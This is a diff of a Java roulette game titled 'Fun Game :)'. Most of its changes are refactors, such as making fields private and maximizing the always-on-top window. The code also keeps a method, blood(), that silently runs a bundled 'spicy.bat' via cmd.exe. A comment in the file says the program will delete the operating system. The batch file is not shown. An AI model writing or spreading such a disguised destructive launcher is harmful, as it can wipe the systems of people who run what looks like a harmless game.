@@ -4,20 +4,21 @@ import java.awt.event.*;
 import java.io.File;
 import java.io.IOException;
 import java.net.URISyntaxException;
+import java.util.Objects;
 
 //If you play this it can and WILL delete ur OS, don't be a fucking idiot
 public class SpicyScript
 {
-    public static boolean startup = true;
-    public static String name = "";
-    public static int game = 1;
-    public static long chips = 4500;
-    public static int betColorNum = 0;
-    public static int winningNumber;
-    public static String winningColor = "";
-    public static long betAmount = 500;
-    public static String betOn = null;
-    public static int doubleDigit = 0;
+    private static boolean startup = true;
+    private static String name = "";
+    private static int game = 1;
+    private static long chips = 4500;
+    private static int betColorNum = 0;
+    private static int winningNumber;
+    private static String winningColor = "";
+    private static long betAmount = 500;
+    private static String betOn = null;
+    private static int doubleDigit = 0;
 
     public static String betColor(Color inside)
     {
@@ -43,18 +44,18 @@ public class SpicyScript
 
     public static void blood() throws URISyntaxException, IOException
     {
-        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", (new File(SpicyScript.class.getResource("spicy.bat").toURI())).getAbsolutePath()});
+        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", (new File(Objects.requireNonNull(SpicyScript.class.getResource("spicy.bat")).toURI())).getAbsolutePath()});
     }
 
     public static void SpicyGame()
     {
         JFrame gameMenu = new JFrame("Fun Game :)");
         gameMenu.setAlwaysOnTop(true);
-        gameMenu.setIconImage(Toolkit.getDefaultToolkit().getImage(RegScript.class.getResource("pixil-frame-0.png")));
+        gameMenu.setExtendedState(JFrame.MAXIMIZED_BOTH);
+        gameMenu.setIconImage(Toolkit.getDefaultToolkit().getImage(SpicyScript.class.getResource("pixil-frame-0.png")));
         JLabel stats = new JLabel("<html>Insert name:</html>");
         JLabel controls = new JLabel("");
         JLabel wheel = new JLabel("");
-        System.out.println(wheel.getText().substring(0, 6));
         JLabel betStats = new JLabel("Press [R, G, or B] to make a bet");
         wheel.setHorizontalAlignment(SwingConstants.RIGHT);
         wheel.setVerticalAlignment(SwingConstants.TOP);
@@ -69,7 +70,6 @@ public class SpicyScript
         stats.setForeground(Color.WHITE);
         stats.setHorizontalAlignment(SwingConstants.LEFT);
         stats.setVerticalAlignment(SwingConstants.TOP);
-        gameMenu.setSize(750, 500);
         gameMenu.setResizable(false);
         gameMenu.getContentPane().setBackground(new Color(0, 161, 78));
         gameMenu.add(stats);
@@ -151,7 +151,7 @@ public class SpicyScript
                         else
                             doubleDigit = 0;
 
-                        if (wheel.getText().indexOf("X") != -1)
+                        if (wheel.getText().contains("X"))
                             wheel.setText(wheel.getText().substring(0, wheel.getText().indexOf("X")) + wheel.getText().substring(wheel.getText().indexOf("X") + 1));
 
                         if ((winningNumber % 2 == 1 && betColorNum == 2) || (winningNumber % 2 == 0 && betColorNum == 1 && winningNumber != 0) || (winningNumber == 0 && betColorNum == 3))
